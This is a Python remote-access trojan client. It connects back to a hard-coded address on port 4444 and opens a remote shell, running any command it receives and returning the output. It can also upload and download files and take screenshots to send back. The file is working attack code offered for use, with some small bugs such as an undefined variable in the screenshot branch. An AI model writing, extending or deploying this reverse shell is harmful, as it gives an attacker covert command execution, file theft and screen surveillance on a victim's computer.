import socket
import json
import subprocess
import os
import pyautogui
import sys

def data_send(data):
    try:
        jsondata = json.dumps(data)
        soc.send(jsondata.encode())
    except BrokenPipeError:
        socket.close()
        sys.exit()
    
def data_recv():
    data = ""
    while True:
        try:
            data = data + soc.recv(4096).decode().rstrip()
            return json.loads(data)
        
        except ValueError:
            continue

def download_arq(arquivo):
    arq = open(arquivo, "wb")
    soc.settimeout(5)
    chunk = soc.recv(4096)

    while chunk:
        arq.write(chunk)
        try:
            chunk = soc.recv(4096)
        
        except socket.timeout as a:
            break

    soc.settimeout(None)
    arq.close()

def upload_arq(arquivo):
    arq = open(arquivo, "rb")
    soc.send(arq.read())

def print():
    screenshot = pyautogui.screenshot()
    screenshot.save("print.png")
    upload_arq("print.png")
    os.remove("print.png")
    download_arq("print.png")
    os.remove("print.png")

    

def shell():
    while True:

        comando = data_recv()
        if comando == "exit":
            break

        elif comando == "clear":
            pass

        elif comando[:3] == "cd ":
            os.chdir(comando[3:])

        elif comando[:6] == "upload":
            download_arq(comando[7:])

        elif comando [:8] == "download":
            upload_arq(comando[9:])
        
        elif comando [:5] == "print":
            screenshot = pyautogui.screenshot()
            screenshot.save("print.png")
            upload_arq("print.png")
            os.remove("print.png")
            download_arq(f"print{count}.png")
            os.remove(f"print{count}.png")

        elif comando == "help":
            pass

        else:
            exe = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            rcomm = exe.stdout.read() + exe.stderr.read()
            rcomm = rcomm.decode()
            data_send(rcomm)

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(("192.168.1.11",4444))
shell()